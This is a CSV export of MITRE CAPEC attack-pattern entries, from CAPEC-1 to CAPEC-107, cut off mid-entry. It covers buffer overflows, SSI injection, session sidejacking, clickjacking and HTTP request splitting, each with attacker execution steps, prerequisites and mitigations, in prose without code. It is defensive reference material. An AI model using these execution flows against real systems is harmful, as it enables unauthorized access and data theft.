CAPEC_ID,Name,Abstraction,Status,Description,Alternate_Terms,Likelihood_Of_Attack,Typical_Severity,Related_Attack_Patterns,Execution_Flow,Prerequisites,Skills_Required,Resources_Required,Indicators,Consequences,Mitigations,Example_Instances,Related_Weaknesses,Taxonomy_Mappings,Notes,Official_website
CAPEC-1,Accessing Functionality Not Properly Constrained by ACLs,Standard,Draft,"In applications, particularly web applications, access to functionality is mitigated by an authorization framework. This framework maps Access Control Lists (ACLs) to elements of the application's functionality; particularly URL's for web apps. In the case that the administrator failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application, or can run queries for data that they otherwise not supposed to.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:122::NATURE:CanPrecede:CAPEC ID:17::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated userTECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Brute force guessing of resource names:TECHNIQUE:Brute force guessing of user names / credentials:TECHNIQUE:Brute force guessing of function names / actions::STEP:2:PHASE:Explore:DESCRIPTION:[Identify Functionality] At each step, the attacker notes the resource or functionality access mechanism invoked upon performing specific actionsTECHNIQUE:Use the web inventory of all forms and inputs and apply attack data to those inputs.:TECHNIQUE:Use a packet sniffer to capture and record network traffic:TECHNIQUE:Execute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment, in order to find weaknesses that can be exploited in a production environment.::STEP:3:PHASE:Experiment:DESCRIPTION:[Iterate over access capabilities] Possibly as a valid user, the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.TECHNIQUE:Fuzzing of API parameters (URL parameters, OS API parameters, protocol parameters)::","::The application must be navigable in a manner that associates elements (subsections) of the application with ACLs.::The various resources, or individual URLs, must be somehow discoverable by the attacker::The administrator must have forgotten to associate an ACL or has associated an inappropriately permissive ACL with a particular navigable resource.::","::SKILL:In order to discover unrestricted resources, the attacker does not need special tools or skills. They only have to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.:LEVEL:Low::",::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::In a J2EE setting, administrators can associate a role that is impossible for the authenticator to grant users, such as NoAccess, with all Servlets to which access is guarded by a limited number of servlets visible to, and accessible by, the user. Having done so, any direct access to those protected Servlets will be prohibited by the web container. In a more general setting, the administrator must mark every resource besides the ones supposed to be exposed to the user as accessible by a role impossible for the user to assume. The default security setting must be to deny access and then grant access only to those resources intended by business logic.::","::Implementing the Model-View-Controller (MVC) within Java EE's Servlet paradigm using a Single front controller pattern that demands that brokered HTTP requests be authenticated before hand-offs to other Action Servlets. If no security-constraint is placed on those Action Servlets, such that positively no one can access them, the front controller can be subverted.::",::276::285::434::693::732::1193::1220::1297::1311::1314::1315::1318::1320::1321::1327::,TAXONOMY NAME:ATTACK:ENTRY ID:1574.010:ENTRY NAME:Hijack Execution Flow: ServicesFile Permissions Weakness::,N/A,https://capec.mitre.org/data/definitions/1.html
CAPEC-10,Buffer Overflow via Environment Variables,Detailed,Draft,"This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:100::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. In this attack the adversary looks for an application that loads the content of an environment variable into a buffer.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.TECHNIQUE:Change the values of environment variables thought to be used by the application to contain excessive data. If the program is loading the value of the environment variable into a buffer, this could cause a crash and an attack vector will be found.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary injects the crafted overflow content into the buffer.::",::The application uses environment variables.::An environment variable exposed to the user is vulnerable to a buffer overflow.::The vulnerable environment variable uses untrusted data.::Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.::,::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::,N/A,"::If the application does bound checking, it should fail when the data source is larger than the size of the destination buffer. If the application's code is well written, that failure should trigger an alert.::",::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,::Do not expose environment variable to the user.::Do not use untrusted data in your environment variables.::Use a language or compiler that performs automatic bounds checking::There are tools such as Sharefuzz [REF-2] which is an environment variable fuzzer for Unix that support loading a shared library. You can use Sharefuzz to determine if you are exposing an environment variable vulnerable to buffer overflow.::,::Attack Example: Buffer Overflow in $HOME A buffer overflow in sccw allows local users to gain root access via the $HOME environmental variable.See also: CVE-1999-0906::Attack Example: Buffer Overflow in TERM A buffer overflow in the rlogin program involves its consumption of the TERM environmental variable.See also: CVE-1999-0046::,::120::302::118::119::74::99::20::680::733::697::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Buffer Overflow via Environment Variables::,N/A,https://capec.mitre.org/data/definitions/10.html
CAPEC-100,Overflow Buffers,Standard,Draft,"Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:123::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.TECHNIQUE:Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary injects the crafted overflow content into the buffer.::",::Targeted software performs buffer operations.::Targeted software inadequately performs bounds-checking on buffer operations.::Adversary has the capability to influence the input to buffer operations.::,"::SKILL:In most cases, overflowing a buffer does not require advanced skills beyond the ability to notice an overflow and stuff an input variable with content.:LEVEL:Low::SKILL:In cases of directed overflows, where the motive is to divert the flow of the program or application as per the adversaries' bidding, high level skills are required. This may involve detailed knowledge of the target system architecture and kernel.:LEVEL:High::",::None: No specialized resources are required to execute this type of attack. Detecting and exploiting a buffer overflow does not require any resources beyond knowledge of and access to the target system.::,"::An attack designed to leverage a buffer overflow and redirect execution as per the adversary's bidding is fairly difficult to detect. An attack aimed solely at bringing the system down is usually preceded by a barrage of long inputs that make no sense. In either case, it is likely that the adversary would have resorted to a few hit-or-miss attempts that will be recorded in the system event logs, if they exist.::",::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Use a language or compiler that performs automatic bounds checking.::Use secure functions not vulnerable to buffer overflow.::If you have to use dangerous functions, make sure that you do boundary checking.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.::","::The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.::Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.::",::120::119::131::129::805::680::,TAXONOMY NAME:WASC:ENTRY ID:07:ENTRY NAME:Buffer Overflow::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Buffer overflow attack::,N/A,https://capec.mitre.org/data/definitions/100.html
CAPEC-101,Server Side Include (SSI) Injection,Detailed,Draft,"An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:253::NATURE:CanPrecede:CAPEC ID:600::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine applicability] The adversary determines whether server side includes are enabled on the target web server.TECHNIQUE:Look for popular page file names. The attacker will look for .shtml, .shtm, .asp, .aspx, and other well-known strings in URLs to help determine whether SSI functionality is enabled.:TECHNIQUE:Fetch .htaccess file. In Apache web server installations, the .htaccess file may enable server side includes in specific locations. In those cases, the .htaccess file lives inside the directory where SSI is enabled, and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file, a misconfigured server will allow it. Thus, an attacker will frequently try it.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find Injection Point] Look for user controllable input, including HTTP headers, that can carry server side include directives to the web server.TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject SSI] Using the found injection point, the adversary sends arbitrary code to be inlcuded by the application on the server side. They may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the adversary.::",::A web server that supports server side includes and has them enabled::User controllable input that can carry include directives to the web server::,"::SKILL:The attacker needs to be aware of SSI technology, determine the nature of injection and be able to craft input that results in the SSI directives being executed.:LEVEL:Medium::","::None: No specialized resources are required to execute this type of attack. Determining whether the server supports SSI does not require special tools, and nor does injecting directives that get executed. Spidering tools can make the task of finding and following links easier.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,"::Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them::All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive::Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead::","::Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the Options Includes directive enabled. Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error. When these logs are eventually reviewed, the server parses the SSI directives and executes them.::",::97::74::20::,TAXONOMY NAME:WASC:ENTRY ID:36:ENTRY NAME:SSI Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Server-Side Includes (SSI) Injection::,N/A,https://capec.mitre.org/data/definitions/101.html
CAPEC-102,Session Sidejacking,Detailed,Draft,"Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim. This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:593::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Detect Unprotected Session Token Transfer] The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.TECHNIQUE:The attacker uses a network sniffer tool like ferret or hamster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies their knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens.::STEP:2:PHASE:Experiment:DESCRIPTION:[Capture session token] The attacker uses sniffing tools to capture a session token from traffic.::STEP:3:PHASE:Experiment:DESCRIPTION:[Insert captured session token] The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation.::STEP:4:PHASE:Exploit:DESCRIPTION:[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.::","::An attacker and the victim are both using the same WiFi network.::The victim has an active session with a target system.::The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)::The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically rings home asynchronously using the session token::",::SKILL:Easy to use tools exist to automate this attack.:LEVEL:Low::,"::A packet sniffing tool, such as wireshark, can be used to capture session information.::",N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,"::Make sure that HTTPS is used to communicate with the target system. Alternatively, use VPN if possible. It is important to ensure that all communication between the client and the server happens via an encrypted secure channel.::Modify the session token with each transmission and protect it with cryptography. Add the idea of request sequencing that gives the server an ability to detect replay attacks.::","::The attacker and the victim are using the same WiFi public hotspot. When the victim connects to the hotspot, they has a hosted e-mail account open. This e-mail account uses AJAX on the client side which periodically asynchronously connects to the server side and transfers, amongst other things, the user's session token to the server. The communication is supposed to happen over HTTPS. However, the configuration in the public hotspot initially disallows the HTTPS connection (or any other connection) between the victim and the hosted e-mail servers because the victim first needs to register with the hotspot. The victim does so, but their e-mail client already defaulted to using a connection without HTTPS, since it was denied access the first time. Victim's session token is now flowing unencrypted between the victim's browser and the hosted e-mail servers. The attacker leverages this opportunity to capture the session token and gain access to the victim's hosted e-mail account.::",::294::522::523::319::614::,N/A,N/A,https://capec.mitre.org/data/definitions/102.html
CAPEC-103,Clickjacking,Standard,Draft,"In a clickjacking attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from a seemingly completely different system. While being logged in to some target system, the victim visits the adversary's malicious site which displays a UI that the victim wishes to interact with. In reality, the clickjacked page has a transparent layer above the visible UI with action controls that the adversary wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the adversary may have just tricked the victim into executing some potentially privileged (and most certainly undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks they are clicking on versus what they are actually clicking on.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:173::,"::STEP:1:PHASE:Experiment:DESCRIPTION:[Craft a clickjacking page] The adversary utilizes web page layering techniques to try to craft a malicious clickjacking pageTECHNIQUE:The adversary leveraged iframe overlay capabilities to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged Flash file overlay capabilities to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged Silverlight overlay capabilities to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged cross-frame scripting to craft a malicious clickjacking page::STEP:2:PHASE:Exploit:DESCRIPTION:[Adversary lures victim to clickjacking page] Adversary utilizes some form of temptation, misdirection or coercion to lure the victim to loading and interacting with the clickjacking page in a way that increases the chances that the victim will click in the right areas.TECHNIQUE:Lure the victim to the malicious site by sending the victim an e-mail with a URL to the site.:TECHNIQUE:Lure the victim to the malicious site by manipulating URLs on a site trusted by the victim.:TECHNIQUE:Lure the victim to the malicious site through a cross-site scripting attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Trick victim into interacting with the clickjacking page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.TECHNIQUE:Hide action controls over very commonly used functionality.:TECHNIQUE:Hide action controls over very psychologically tempting content.::","::The victim is communicating with the target application via a web based UI and not a thick client::The victim's browser security policies allow at least one of the following JavaScript, Flash, iFrames, ActiveX, or CSS.::The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser)::The victim has an active session with the target system.::The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system::",::SKILL:Crafting the proper malicious site and luring the victim to this site are not trivial tasks.:LEVEL:High::,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,"::If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.::Turn off JavaScript, Flash and disable CSS.::When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.::","::A victim has an authenticated session with a site that provides an electronic payment service to transfer funds between subscribing members. At the same time, the victim receives an e-mail that appears to come from an online publication to which they subscribe with links to today's news articles. The victim clicks on one of these links and is taken to a page with the news story. There is a screen with an advertisement that appears on top of the news article with the 'skip this ad' button. Eager to read the news article, the user clicks on this button. Nothing happens. The user clicks on the button one more time and still nothing happens. In reality, the victim activated a hidden action control located in a transparent layer above the 'skip this ad' button. The ad screen blocking the news article made it likely that the victim would click on the 'skip this ad' button. Clicking on the button, actually initiated the transfer of $1000 from the victim's account with an electronic payment service to an adversary's account. Clicking on the 'skip this ad' button the second time (after nothing seemingly happened the first time) confirmed the transfer of funds to the electronic payment service.::",::1021::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Clickjacking::,N/A,https://capec.mitre.org/data/definitions/103.html
CAPEC-104,Cross Zone Scripting,Standard,Draft,An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security.,N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:233::,::STEP:1:PHASE:Explore:DESCRIPTION:[Find systems susceptible to the attack] Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.TECHNIQUE:Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find the insertion point for the payload] The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e. the code to be executed) to the user. The location from which this code is executed in the user's browser needs to be within the local machine zone.TECHNIQUE:Finding weaknesses in functionality used by both privileged and unprivileged users.::STEP:3:PHASE:Exploit:DESCRIPTION:[Craft and inject the payload] Develop the payload to be executed in the higher privileged zone in the user's browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.TECHNIQUE:The attacker makes it as likely as possible that the vulnerable functionality into which they have injected the payload has a high likelihood of being used by the victim.:TECHNIQUE:Leverage cross-site scripting vulnerability to inject payload.::,::The target must be using a zone-aware browser.::,::SKILL:Ability to craft malicious scripts or find them elsewhere and ability to identify functionality that is running web controls in the local zone and to find an injection vector into that functionality:LEVEL:Medium::,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,::Disable script execution.::Ensure that sufficient input validation is performed for any potentially untrusted data before it is used in any privileged context or zone::Limit the flow of untrusted data into the privileged areas of the system that run in the higher trust zone::Limit the sites that are being added to the local machine zone and restrict the privileges of the code running in that zone to the bare minimum::Ensure proper HTML output encoding before writing user supplied data to the page::,"::There was a cross zone scripting vulnerability discovered in Skype that allowed one user to upload a video with a maliciously crafted title that contains a script. Subsequently, when the victim attempts to use the add video to chat feature on attacker's video, the script embedded in the title of the video runs with local zone privileges. Skype is using IE web controls to render internal and external HTML pages. Add video to chat uses these web controls and they are running in the Local Zone. Any user who searched for the video in Skype with the same keywords as in the title field, would have the attackers' code executing in their browser with local zone privileges to their host machine (e.g. applications on the victim's host system could be executed).::",::250::638::285::116::20::,N/A,N/A,https://capec.mitre.org/data/definitions/104.html
CAPEC-105,HTTP Request Splitting,Detailed,Stable,"An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to split a single HTTP request into multiple unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server). See CanPrecede relationships for possible consequences.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:34::NATURE:CanPrecede:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:593::NATURE:CanPrecede:CAPEC ID:148::NATURE:CanPrecede:CAPEC ID:154::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.TECHNIQUE:Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests with custom strings and embedded web scripts and objects in HTTP headers to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.TECHNIQUE:Continue the monitoring of HTTP traffic.:TECHNIQUE:Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed: additional HTTP Requests with their own headers malicious web scripts into parameters of HTTP Request headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest) adversary chosen encoding (e.g., UTF-7) to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent. Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant.:TECHNIQUE:Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request.::STEP:1:PHASE:Exploit:DESCRIPTION:[Perform HTTP Request Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.TECHNIQUE:Leverage techniques identified in the Experiment Phase.::","::An additional intermediary HTTP agent such as an application firewall or a web caching proxy between the adversary and the second agent such as a web server, that sends multiple HTTP messages over same network connection.::Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.::HTTP headers capable of being user-manipulated.::HTTP agents running on HTTP/1.0 or HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.::","::SKILL:Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.:LEVEL:Medium::SKILL:Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.:LEVEL:Medium::SKILL:Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.:LEVEL:Medium::",::Tools capable of crafting malicious HTTP messages and monitoring HTTP messages responses.::,::Differences in requests processed by the two agents. This requires careful monitoring or a capable log analysis tool.::,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.::Configuration: front-end HTTP agents notice ambiguous requests.::Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.::Configuration: Disable reuse of back-end connections.::Configuration: Use HTTP/2 for back-end connections.::Configuration: Use the same web server software for front-end and back-end server.::Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.::Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)::Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.::Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.::,"::Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, and 7.0 contain a vulnerability that could allow an unauthenticated, remote adversary to conduct HTTP request splitting and smuggling attacks. The vulnerability is due to an input validation error in the browser that allows adversaries to manipulate certain headers to expose the browser to HTTP request splitting and smuggling attacks. Attacks may include cross-site scripting, proxy cache poisoning, and session fixation. In certain instances, an exploit could allow the adversary to bypass web application firewalls or other filtering devices. Microsoft has confirmed the vulnerability and released software updates.::",::74::138::436::,TAXONOMY NAME:WASC:ENTRY ID:24:ENTRY NAME:HTTP Request Splitting::,TYPE:Terminology:NOTE:HTTP Splitting – the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension. The messages sent are 100% valid and RFC compliant [REF-117].::::TYPE:Terminology:NOTE:HTTP Smuggling – the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way [REF-117].::::TYPE:Relationship:NOTE:HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.::,https://capec.mitre.org/data/definitions/105.html
CAPEC-107,Cross Site Tracing,Detailed,Draft,Cross Site Tracing (XST) enables an adversary to steal the victim's session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim's browser communicates to a destination system's web server.,N/A,Medium,Very High,::NATURE:ChildOf:CAPEC ID:593::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine if HTTP Trace is enabled] Determine if HTTP Trace is enabled at the web server with which the victim has an active sessionTECHNIQUE:An adversary may issue an HTTP Trace request to the target web server and observe if the response arrives with the original request in the body of the response.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify mechanism to launch HTTP Trace request] The adversary attempts to force the victim to issue an HTTP Trace request to the targeted application.TECHNIQUE:The adversary probes for cross-site scripting vulnerabilities to force the victim into issuing an HTTP Trace request.::STEP:3:PHASE:Exploit:DESCRIPTION:[Create a malicious script that pings the web server with HTTP TRACE request] The adversary creates a malicious script that will induce the victim's browser to issue an HTTP TRACE request to the destination system's web server. The script will further intercept the response from the web server, pick up sensitive information out of it, and forward to the site controlled by the adversary.TECHNIQUE:The adversary's malicious script circumvents the httpOnly cookie attribute that prevents from hijacking the victim's session cookie directly using document.cookie and instead leverages the HTTP TRACE to catch this information from the header of the HTTP request once it is echoed back from the web server in the body of the HTTP TRACE 